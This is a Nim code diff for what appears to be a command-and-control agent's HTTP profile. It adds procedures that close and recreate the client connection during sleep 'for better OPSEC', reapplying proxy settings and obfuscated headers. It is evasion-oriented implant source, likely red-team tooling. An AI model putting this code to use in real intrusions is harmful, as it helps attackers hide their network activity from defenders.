@@ -193,6 +193,46 @@ proc hasAesKey*(profile: HttpProfile): bool =
   ## Check if AES key is set
   result = profile.aesKey.len > 0
 
+proc cleanup*(profile: var HttpProfile) =
+  ## Close HTTP client connection to avoid keeping ESTABLISHED connections during sleep
+  ## Closes underlying socket connections on both Windows and Linux for better OPSEC
+  debug "[DEBUG] HTTP Profile: Cleaning up client connection"
+  # Close the httpclient and its connections
+  try:
+    profile.client.closeWrapper()
+    debug "[DEBUG] HTTP Profile: Client connection closed"
+  except:
+    debug "[DEBUG] HTTP Profile: Failed to close client: ", getCurrentExceptionMsg()
+
+proc reconnect*(profile: var HttpProfile) =
+  ## Recreate HTTP client connection after cleanup
+  ## This ensures we have a fresh connection for the next request on both Windows and Linux
+  debug "[DEBUG] HTTP Profile: Recreating client connection"
+  # Recreate client with same settings
+  if profile.config.proxyHost.len > 0 and profile.config.proxyPort.len > 0:
+    var proxyUrl = "http://" & profile.config.proxyHost & ":" & profile.config.proxyPort
+    if profile.config.proxyUser.len > 0 and profile.config.proxyPass.len > 0:
+      proxyUrl = "http://" & profile.config.proxyUser & ":" & profile.config.proxyPass & "@" & 
+                 profile.config.proxyHost & ":" & profile.config.proxyPort
+    try:
+      profile.client = newClientWrapperWithProxy(proxyUrl)
+    except:
+      debug "[DEBUG] HTTP Profile: Failed to recreate client with proxy"
+      profile.client = newClientWrapper()
+  else:
+    profile.client = newClientWrapper()
+  
+  # Reapply headers
+  profile.client.headers = newHttpHeaders({obf("User-Agent"): profile.config.userAgent})
+  if profile.config.headers.len > 0:
+    try:
+      let headersJson = parseJson(profile.config.headers)
+      for key, val in headersJson.pairs:
+        profile.client.headers[key] = val.getStr()
+    except:
+      discard
+  debug "[DEBUG] HTTP Profile: Client connection recreated"
+
 proc performKeyExchange*(profile: var HttpProfile): tuple[success: bool, newUuid: string] =
   ## Perform RSA key exchange to establish AES session key
   ## Returns (success, newUuid) tuple where newUuid is the callback UUID from server
